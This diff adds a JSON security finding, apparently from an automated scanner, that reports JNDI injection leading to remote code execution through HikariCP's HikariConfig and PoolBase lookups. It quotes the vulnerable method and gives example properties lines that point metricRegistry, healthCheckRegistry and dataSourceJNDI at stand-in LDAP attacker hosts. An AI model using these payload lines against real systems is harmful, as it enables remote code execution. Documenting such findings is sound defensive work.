@@ -1,0 +1,23 @@
+[
+  {
+    "FindingID": "5db05fc9-d98d-5cd2-8038-d0bc2b89f367",
+    "SessionID": "ChBjOGYxMmU0MDQyZjkyM2Q4EAgaATAqBG1haW4",
+    "Title": "JNDI Injection via HikariConfig property lookup or dataSourceJNDI lookup",
+    "FilePath": "/home/jfplante_google_com/repos/h08-hikaricp_rep2/src/main/java/com/zaxxer/hikari/HikariConfig.java",
+    "Severity": "HIGH",
+    "Confidence": 100,
+    "Analysis": "In `com.zaxxer.hikari.HikariConfig`, the helper method `getObjectOrPerformJndiLookup` (lines 1190-1202) is invoked when the metricRegistry property (via `setMetricRegistry()`) or healthCheckRegistry property (via `setHealthCheckRegistry()`) is set as a string. This method instantiates an unconfigured JNDI `InitialContext` and performs a JNDI `lookup()` on the user-supplied string value. If an attacker has control over the configuration properties of `HikariConfig` (e.g. from a user-supplied property file or configuration interface), they can specify a malicious JNDI URL (such as `ldap://attacker.com/Exploit`) leading to JNDI injection and remote code execution (RCE).\n\nSimilarly, in `com.zaxxer.hikari.pool.PoolBase` during `initializeDataSource` (line 331-332), if `dataSourceJNDI` is specified, an `InitialContext` is instantiated and `lookup()` is called with `dataSourceJNDI`. Additionally, in `com.zaxxer.hikari.HikariJNDIFactory` (lines 56-86), `lookupJndiDataSource` queries the `dataSourceJNDI` JNDI name.\n\nThese functions lack any input validation or sanitization, allowing arbitrary JNDI lookup strings to be evaluated.\n\n**Conceptual Exploit Payload:**\nIn a configuration file (or properties parameter) passed to `HikariConfig`:\n```properties\nmetricRegistry=ldap://attacker_control_server/object\n# or\nhealthCheckRegistry=ldap://attacker_control_server/object\n# or\ndataSourceJNDI=ldap://attacker_control_server/object\n```\nThis forces JNDI to connect to `attacker_control_server` and fetch/load a malicious remote object, triggering remote code execution.",
+    "Snippet": "   private Object getObjectOrPerformJndiLookup(Object object)\n   {\n      if (object instanceof String) {\n         try {\n            var initCtx = new InitialContext();\n            return initCtx.lookup((String) object);\n         }\n         catch (NamingException e) {\n            throw new IllegalArgumentException(e);\n         }\n      }\n      return object;\n   }",
+    "VulnType": "Injection",
+    "VulnID": "CWE-74",
+    "Fingerprint": "",
+    "Status": "OPEN",
+    "SourceStage": "",
+    "FindingJSON": "",
+    "UpdatedAt": "",
+    "StartLine": 1190,
+    "EndLine": 1202,
+    "DismissReason": "",
+    "ConfidenceLevel": ""
+  }
+]
